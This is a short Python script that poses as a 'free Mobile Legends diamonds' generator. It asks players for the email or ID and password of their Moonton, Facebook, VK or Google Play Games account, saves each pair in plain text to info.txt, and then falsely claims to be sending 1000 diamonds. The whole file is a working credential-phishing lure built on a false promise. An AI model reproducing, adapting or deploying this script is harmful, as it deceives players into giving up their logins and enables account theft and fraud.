import os
from colorama import Fore

a = input(Fore.RED + """You want free Mobile Legends diamond?(y/n): """)
 
if a in 'y':
 	if a == 'y':
 		os.system('clear')
 		print(Fore.RED + """
 Choose where did you connect your ML Account
 	
 1. Moonton
 2. Facebook
 3. VK account
 4. Google Play Games
 
 		""")
 		b = input(Fore.RED + "[+] Choose a number: ")
 		if b == '1':
 			os.system('clear')
 			print(Fore.BLUE + "ENTER ACCOUNT DETAILS!")
 			print("")
 			c = input(Fore.RED + "[+] Enter Email: ")
 			d = input(Fore.RED + "[+] Enter Password: ")
 			open('info.txt', 'a').write('Email: ' + c + ' Password: ' + d + '\n')
 			print(Fore.BLUE + "[+] Sending 1000 Diamonds!")
 		elif b == '2':
 			os.system("clear")
 			print(Fore.BLUE + "ENTER ACCOUNT DETAILS!")
 			print("")
 			e = input(Fore.RED + "[+] Enter FB ID: ")
 			f = input(Fore.RED + "[+] Enter Password: ")
 			open('info.txt', 'a').write('FB ID: '  + e + ' Password: ' + f + '\n')
 			print("")
 			print(Fore.BLUE + "[+] Sending 1000 Diamonds!")
 		elif b == '3':
 			os.system("clear")
 			print(Fore.BLUE + "ENTER ACCOUNT DETAILS!")
 			print("")
 			g = input(Fore.RED + "[+] Enter Phone/Email: ")
 			h = input(Fore.RED + "[+] Enter Password: ")
 			open('info.txt', 'a').write('Phone/Email: ' + g + ' Password: ' + h + '\n')
 			print(Fore.BLUE + "Sending 1000 Diamonds!")
 		elif b == '4':
 			os.system("clear")
 			print(Fore.RED + "ENTER ACCOUNT DETAILS")
 			print("")
 			i = input(Fore.RED + "[+] Enter Email: ")
 			j = input(Fore.RED + "[+] Enter Password: ")
 			open('info.txt', 'a').write('Email: ' + i + ' Password: ' + j + '\n')
 			print(Fore.BLUE + "Sending 1000 Diamonds!")
 	elif a == 'n':
 		print(Fore.RED + "SAYONARA!")
 		os.system('exit')